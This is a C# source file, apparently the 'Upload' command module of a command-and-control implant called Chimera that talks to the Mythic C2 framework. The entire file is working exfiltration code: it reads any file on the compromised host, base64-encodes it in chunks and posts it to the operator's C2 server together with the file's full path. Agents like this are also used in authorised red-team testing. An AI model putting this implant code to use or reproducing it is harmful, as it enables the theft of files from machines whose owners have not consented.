using System;
using System.IO;
using System.Net.Http;
using System.Text;

namespace Chimera.Commands
{
    public static class Upload
    {
        private const int CHUNK_SIZE = 512 * 1024; // 512KB chunks

        public static string Execute(string remotePath, string taskID, string callbackUUID)
        {
            try
            {
                if (!File.Exists(remotePath))
                    return $"[error] File not found: {remotePath}";

                byte[] fileBytes = File.ReadAllBytes(remotePath);
                int totalChunks = (int)Math.Ceiling((double)fileBytes.Length / CHUNK_SIZE);
                string fileID   = null;

                for (int i = 0; i < totalChunks; i++)
                {
                    int offset    = i * CHUNK_SIZE;
                    int chunkSize = Math.Min(CHUNK_SIZE, fileBytes.Length - offset);
                    byte[] chunk  = new byte[chunkSize];
                    Buffer.BlockCopy(fileBytes, offset, chunk, 0, chunkSize);

                    string chunkB64 = Convert.ToBase64String(chunk);

                    // First chunk — tell Mythic we're starting an upload
                    string json;
                    if (i == 0)
                    {
                        json = $@"{{
                            ""action"": ""post_response"",
                            ""uuid"": ""{callbackUUID}"",
                            ""responses"": [{{
                                ""task_id"": ""{taskID}"",
                                ""upload"": {{
                                    ""chunk_num"": {i + 1},
                                    ""total_chunks"": {totalChunks},
                                    ""chunk_data"": ""{chunkB64}"",
                                    ""full_path"": ""{remotePath.Replace("\\", "\\\\")}""
                                }}
                            }}]
                        }}";
                    }
                    else
                    {
                        json = $@"{{
                            ""action"": ""post_response"",
                            ""uuid"": ""{callbackUUID}"",
                            ""responses"": [{{
                                ""task_id"": ""{taskID}"",
                                ""upload"": {{
                                    ""chunk_num"": {i + 1},
                                    ""total_chunks"": {totalChunks},
                                    ""chunk_data"": ""{chunkB64}"",
                                    ""file_id"": ""{fileID}""
                                }}
                            }}]
                        }}";
                    }

                    string response = C2Http.Send(json);

                    // Extract file_id from first response
                    if (i == 0 && response != null)
                        fileID = Tasking.ExtractJsonValue(response, "file_id");
                }

                return $"[+] Uploaded {remotePath} ({fileBytes.Length} bytes, {totalChunks} chunks)";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }
    }
}
